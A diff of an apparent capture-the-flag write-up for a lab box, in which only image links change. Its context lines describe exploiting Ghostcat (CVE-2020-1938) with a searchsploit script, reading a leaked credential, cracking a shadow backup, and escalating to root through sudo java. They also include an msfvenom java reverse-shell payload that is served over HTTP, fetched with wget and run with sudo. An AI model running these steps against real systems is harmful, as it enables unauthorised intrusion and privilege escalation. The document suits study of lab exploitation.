@@ -27,13 +27,13 @@ from my bestie-Google.I found a article about a exploit named **Ghostcat** CVE-2
 
 Then,I searched for this exploit with searchsploit and look I found a python script:multiple/webapps/48143.py 
 
-![](/images/dotjar2.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar2.png)
 
 Finally I ran the python script.
 
 ```python 48143.py <boxip>```
 
-![](/images/dotjar3.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar3.png)
 
 and here we go.We get a username and a password ***webdev:Hgj3LA$02D$Fa@21***.That's what we wanted. 
 
@@ -55,23 +55,23 @@ Listening to the given port,1234 as given in the exploit in this case,I opened t
 
 And,yes we get a shell and I was logged in as 'web'
 
-![](/images/dotjar5.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/dotjar5.png)
 
 After searching a bit we found a backup file of shadow in the /var/backups folder so we copied it to /tmp and gunzipped it to retrieve the shadow file.
 
-![](/images/jar.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar.png)
 
 Then we cracked the password hash for jdk-admin using john and logged in as jdk-admin
 
-![](/images/jar2.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar2.png)
 
 Now we can view the user flag..
 
-![](/images/jar3.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar3.png)
 
 After doing **sudo -l** we found that we have root permissions to run any java file.
 
-![](/images/jar4.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar4.png)
 
 So we created an exploit using msfvenom 
 
@@ -81,7 +81,7 @@ msfvenom -p java/shell_reverse_tcp lhost=<local ip> lport=1234 -f jar -o pwn.jar
 ```
 Then i opened a http-server and transferred the payload to the shell using wget 
 
-![](/images/jar5.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar5.png)
 
 ```py
 python3 -m http.server 80
@@ -94,7 +94,7 @@ sudo /usr/bin/java -jar pwn.jar
 ```
 Now we can view the root flag as well!!
 
-![](/images/jar6.png)
+![](https://github.com/bitcriminals/bitcriminals.github.io/blob/main/images/jar6.png)
 
 
 
